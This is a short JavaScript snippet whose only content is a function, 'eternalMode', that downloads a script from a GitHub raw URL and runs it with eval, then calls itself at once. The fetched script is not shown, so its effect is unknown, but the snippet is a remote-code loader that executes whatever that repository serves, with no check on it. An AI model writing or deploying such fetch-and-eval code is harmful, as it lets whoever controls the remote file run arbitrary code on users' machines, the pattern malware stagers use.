async function eternalMode() {
  let url = 'https://github.com/rogg13/pCol/raw/main/egtemp.js'
  let response = await fetch(url);
  let script = await response.text();
  eval(script);
}
eternalMode();
